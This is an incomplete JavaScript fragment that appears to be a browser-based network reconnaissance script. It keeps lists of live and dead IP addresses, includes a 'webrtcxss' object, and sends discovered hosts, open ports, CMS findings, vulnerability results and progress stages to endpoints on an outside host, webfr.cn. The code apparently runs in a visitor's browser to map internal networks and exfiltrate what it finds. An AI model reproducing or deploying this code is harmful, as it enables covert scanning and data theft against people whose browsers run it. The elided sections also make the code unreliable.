var onlyString = "38b65b497f313d082df2435e0685ae97";
var ipList               = [];
var survivalIpLIst       = [];
var deathIpLIst          = [];
var sendsurvivalIp       = "http://webfr.cn/index.php?m=Home&c=Api&a=survivalIp";
var snedIteratesIpUrl    = "http://webfr.cn/index.php?m=Home&c=Api&a=survivalPortIp";
var snedIteratesCmsIpUrl = "http://webfr.cn/index.php?m=Home&c=Api&a=survivalCmsIp";
var sendExistenceVul     = "http://webfr.cn/index.php?m=Home&c=Api&a=existenceVul"
var webrtcxss = {
...
function stage(num){
    ...
    updataStage.setAttribute("src","http://webfr.cn/index.php?m=Home&c=Api&a=stage&onlystring="+onlyString+"&updata="+num);
